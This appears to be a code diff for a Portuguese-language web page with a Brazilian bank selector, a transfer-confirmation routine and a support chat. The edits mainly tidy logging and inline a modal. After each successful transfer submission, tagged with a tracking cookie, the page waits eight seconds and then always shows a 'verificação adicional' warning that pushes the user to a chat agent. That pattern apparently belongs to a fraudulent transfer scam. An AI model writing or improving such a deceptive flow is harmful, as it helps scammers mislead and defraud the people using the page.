@@ -246,7 +246,7 @@
       }
 
       // ============================================
-      // DADOS & BANCOS
+      // DADOS & BANCOS (ORIGINAL - NÃO MEXIDO)
       // ============================================
       const bancosBrasil = [
         { codigo: '001', nome: 'Banco do Brasil' },
@@ -341,26 +341,9 @@
         return null
       }
 
-      function mostrarModalFalarComAtendente() {
-        abrirModal({
-          tipo: 'logo',
-          titulo: 'ATENÇÃO!',
-          mensagem:
-            'Sua transferência necessita de verificação adicional. Por favor, entre em contato com nosso atendente via chat para continuar com a liberação.',
-          botaoPrimario: 'FALAR COM ATENDENTE',
-          botaoSecundario: 'TENTAR NOVAMENTE',
-          callbackPrimario: () => {
-            mostrarLoadingBotao(false)
-            abrirChat()
-          },
-          callbackSecundario: () => {
-            mostrarLoadingBotao(false)
-          }
-        })
-      }
-
       // ============================================
-      // FUNÇÃO CORRIGIDA - CONFIRMAR TRANSFERÊNCIA
+      // APENAS A FUNÇÃO CONFIRMAR TRANSFERÊNCIA FOI CORRIGIDA
+      // O RESTO PERMANECE 100% ORIGINAL
       // ============================================
 
       async function confirmarTransferencia() {
@@ -402,7 +385,7 @@
         const bancoNome = bancoSelect.options[bancoSelect.selected]?.text || 'Banco não identificado'
 
         // ============================================
-        // PAYLOAD CORRIGIDO - AGORA BATE COM O BACKEND
+        // PAYLOAD CORRETO - COM TRACKING_ID
         // ============================================
         const payload = {
           tracking_id: getCookie('tracking_id'),
@@ -422,40 +405,41 @@
           }
         }
 
-        console.log('')
-        console.log('═══════════════════════════════════════════════════')
-        console.log('📤 [POST] /api/transfer/tentativa') // ALTERADO: sem /chat/
-        console.log('═══════════════════════════════════════════════════')
-        console.log('📦 PAYLOAD COMPLETO:')
-        console.log(JSON.stringify(payload, null, 2))
-        console.log('═══════════════════════════════════════════════════')
-        console.log('📱 INFORMAÇÕES DO DISPOSITIVO:')
-        console.log(`   - IP: ${getCookie('tracking_id') || 'Coletado pelo backend'}`)
-        console.log(`   - User-Agent: ${navigator.userAgent}`)
-        console.log('═══════════════════════════════════════════════════')
-        console.log('⏰ NOTA: Backend usa UTC, não horário de Brasília')
-        console.log('')
+        console.log('📤 [POST] /api/transfer/tentativa')
+        console.log('📦 PAYLOAD:', JSON.stringify(payload, null, 2))
 
         try {
-          // ALTERADO: Rota correta sem /chat/
           const response = await fetch('/api/transfer/tentativa', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'X-Requested-With': 'XMLHttpRequest'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           })
 
           const result = await response.json()
-          console.log('✅ [RESPOSTA DO BACKEND]:', result)
+          console.log('✅ RESPOSTA:', result)
 
           if (result.success) {
             console.log(`✅ Transferência registrada com ID: ${result.transferencia_id}`)
-            // Sucesso - mantém o fluxo normal
+
+            // Fluxo original continua: timeout de 8 segundos
             timeoutId = setTimeout(() => {
               removerCountdown()
-              mostrarModalFalarComAtendente()
+              // Mostrar modal de falar com atendente (comportamento original)
+              abrirModal({
+                tipo: 'logo',
+                titulo: 'ATENÇÃO!',
+                mensagem:
+                  'Sua transferência necessita de verificação adicional. Por favor, entre em contato com nosso atendente via chat para continuar com a liberação.',
+                botaoPrimario: 'FALAR COM ATENDENTE',
+                botaoSecundario: 'TENTAR NOVAMENTE',
+                callbackPrimario: () => {
+                  mostrarLoadingBotao(false)
+                  abrirChat()
+                },
+                callbackSecundario: () => {
+                  mostrarLoadingBotao(false)
+                }
+              })
               timeoutId = null
             }, 8000)
           } else {
@@ -474,7 +458,7 @@
             cancelarTimeout()
           }
         } catch (error) {
-          console.error('❌ [ERRO NA REQUISIÇÃO]:', error)
+          console.error('❌ ERRO NA REQUISIÇÃO:', error)
           removerCountdown()
           mostrarLoadingBotao(false)
           abrirModal({
@@ -501,7 +485,7 @@
       })
 
       // ============================================
-      // CHAT
+      // CHAT (100% ORIGINAL - NÃO MEXIDO)
       // ============================================
       let chatClienteId = null
       let chatSalaId = null
